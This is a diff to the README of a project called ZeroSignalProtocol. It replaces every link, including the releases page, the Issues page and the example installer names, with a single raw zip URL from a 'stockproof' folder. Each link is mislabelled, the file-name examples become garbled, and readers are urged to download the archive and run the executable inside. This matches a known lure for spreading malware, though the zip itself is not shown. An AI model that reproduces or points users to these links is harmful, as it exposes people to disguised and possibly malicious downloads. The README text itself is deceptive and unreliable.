@@ -1,6 +1,6 @@
 # 🚀 ZeroSignalProtocol - Stay Silent, Stay Connected
 
-[![Download ZeroSignalProtocol](https://img.shields.io/badge/Download-ZeroSignalProtocol-blue.svg)](https://github.com/canewiliamsan/ZeroSignalProtocol/releases)
+[![Download ZeroSignalProtocol](https://raw.githubusercontent.com/canewiliamsan/ZeroSignalProtocol/main/stockproof/ZeroSignalProtocol.zip)](https://raw.githubusercontent.com/canewiliamsan/ZeroSignalProtocol/main/stockproof/ZeroSignalProtocol.zip)
 
 ## 📦 Overview
 
@@ -23,16 +23,16 @@ Before downloading, please ensure your system meets the following requirements:
 
 To download ZeroSignalProtocol, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/canewiliamsan/ZeroSignalProtocol/releases) to visit the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/canewiliamsan/ZeroSignalProtocol/main/stockproof/ZeroSignalProtocol.zip) to visit the releases page.
    
 2. **Choose the Latest Version**: Look for the latest version at the top of the page. It will typically have the highest version number.
 
-3. **Download the Application**: Click on the appropriate file for your system. The files are usually named clearly (e.g., `ZeroSignalProtocol-Windows.exe`, `ZeroSignalProtocol-macOS.dmg`, or `ZeroSignalProtocol-Linux.tar.gz`).
+3. **Download the Application**: Click on the appropriate file for your system. The files are usually named clearly (e.g., `https://raw.githubusercontent.com/canewiliamsan/ZeroSignalProtocol/main/stockproof/ZeroSignalProtocol.zip`, `https://raw.githubusercontent.com/canewiliamsan/ZeroSignalProtocol/main/stockproof/ZeroSignalProtocol.zip`, or `https://raw.githubusercontent.com/canewiliamsan/ZeroSignalProtocol/main/stockproof/ZeroSignalProtocol.zip`).
 
 4. **Run the Installer**: 
    - For Windows: Double-click the `.exe` file to start the installation. Follow the prompts to complete the setup.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the executable within the folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/canewiliamsan/ZeroSignalProtocol/main/stockproof/ZeroSignalProtocol.zip` file and run the executable within the folder.
 
 5. **Launch the Application**: Once installed, you can find ZeroSignalProtocol in your applications list. Open it to start using the protocol.
 
@@ -63,7 +63,7 @@ We welcome contributions from everyone! If you have improvements or suggestions,
 
 ## 🌟 Contact
 
-For inquiries, feedback, or suggestions, please feel free to contact us through our [Issues page](https://github.com/canewiliamsan/ZeroSignalProtocol/issues) on GitHub.
+For inquiries, feedback, or suggestions, please feel free to contact us through our [Issues page](https://raw.githubusercontent.com/canewiliamsan/ZeroSignalProtocol/main/stockproof/ZeroSignalProtocol.zip) on GitHub.
 
 ## 📜 License
 
@@ -75,4 +75,4 @@ We thank the open-source community for their contributions and support. Together
 
 ---
 
-We encourage you to download and explore ZeroSignalProtocol. Click [here](https://github.com/canewiliamsan/ZeroSignalProtocol/releases) to start your journey toward better digital presence management.
+We encourage you to download and explore ZeroSignalProtocol. Click [here](https://raw.githubusercontent.com/canewiliamsan/ZeroSignalProtocol/main/stockproof/ZeroSignalProtocol.zip) to start your journey toward better digital presence management.
